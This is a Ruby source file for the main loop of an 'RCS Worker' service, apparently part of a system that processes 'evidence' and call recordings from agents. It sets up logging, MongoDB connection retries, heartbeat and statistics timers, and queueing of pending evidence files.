#
# The main file of the worker
#

# relatives
require_relative 'call_processor'
require_relative 'evidence/call'
require_relative 'heartbeat'
require_relative 'backlog'
require_relative 'statistics'

# from RCS::DB
if File.directory?(Dir.pwd + '/lib/rcs-worker-release')
  require 'rcs-db-release/config'
  require 'rcs-db-release/db_layer'
else
  require 'rcs-db/config'
  require 'rcs-db/db_layer'
end

# from RCS::Common
require 'rcs-common/trace'
require 'rcs-common/fixnum'

# form System
require 'digest/md5'
require 'optparse'

require 'eventmachine'

module RCS
module Worker

class Worker
  include Tracer
  extend Tracer

  def run

    # all the events are handled here
    EM::run do
      # if we have epoll(), prefer it over select()
      EM.epoll

      # set the thread pool size
      EM.threadpool_size = 50

      #Worker::resume_pending_evidences

      # set up the heartbeat (the interval is in the config)
      EM.defer(proc{ HeartBeat.perform })
      EM::PeriodicTimer.new(RCS::DB::Config.instance.global['HB_INTERVAL']) { EM.defer(proc{ HeartBeat.perform }) }

      # calculate and save the stats
      EM::PeriodicTimer.new(60) { EM.defer(proc{ StatsManager.instance.calculate }) }

      trace :info, "Worker '#{RCS::DB::Config.instance.global['SHARD']}' ready!"
    end
    
  end

  def self.resume_pending_evidences
    begin
      db = Mongoid.database
      evidences = db.collection('grid.evidence.files').find({metadata: {shard: RCS::DB::Config.instance.global['SHARD']}}, {sort: ["_id", :asc]})
      trace :info, "No pending evidence to be processed." unless evidences.has_next?
      evidences.each do |ev|
        ident, instance = ev['filename'].split(":")

        # resume pending evidence
        QueueManager.instance.queue instance, ident, ev['_id'].to_s

        # close recording calls for this agent
        agent = Item.agents.where({ident: ident, instance: instance}).first
        unless agent.nil?
          target = agent.get_parent
          calls = ::Evidence.collection_class(target[:_id].to_s).where({"type" => :call, "data.status" => :recording})
          trace :info, "No calls left in recording state." unless calls.empty?
          calls.each do |c|
            trace :debug, "Call #{c} is now set to completed."
            c.update_attributes("data.status" => :completed)
          end
        end

      end
    rescue Exception => e
      trace :error, "Cannot process pending evidences: #{e.message}"
    end
  end

end

class Application
  include RCS::Tracer
  
  # To change this template use File | Settings | File Templates.
  def run(options) #, file)
    
    # if we can't find the trace config file, default to the system one
    if File.exist? 'trace.yaml'
      typ = Dir.pwd
      ty = 'trace.yaml'
    else
      typ = File.dirname(File.dirname(File.dirname(__FILE__)))
      ty = typ + "/config/trace.yaml"
      #puts "Cannot find 'trace.yaml' using the default one (#{ty})"
    end
    
    # ensure the log directory is present
    Dir::mkdir(Dir.pwd + '/log') if not File.directory?(Dir.pwd + '/log')
    Dir::mkdir(Dir.pwd + '/log/err') if not File.directory?(Dir.pwd + '/log/err')

    # initialize the tracing facility
    begin
      trace_init typ, ty
    rescue Exception => e
      puts e
      exit
    end
    
    begin
      build = File.read(Dir.pwd + '/config/VERSION_BUILD')
      $version = File.read(Dir.pwd + '/config/VERSION')
      trace :fatal, "Starting the RCS Worker #{$version} (#{build})..."
      
      # config file parsing
      return 1 unless RCS::DB::Config.instance.load_from_file
      
      # connect to MongoDB
      until RCS::DB::DB.instance.connect
        trace :warn, "Cannot connect to MongoDB, retrying..."
        sleep 5
      end

      # do the dirty job!
      Worker.new.run

      # never reached...

    rescue Interrupt
      trace :info, "User asked to exit. Bye bye!"
      return 0
    rescue Exception => e
      trace :fatal, "FAILURE: " << e.to_s
      trace :fatal, "EXCEPTION: " + e.backtrace.join("\n")
      return 1
    end
    
    return 0
  end
  
  # we instantiate here an object and run it
  def self.run!(*argv)
    return Application.new.run argv
  end
end

end # Worker::
end # RCS::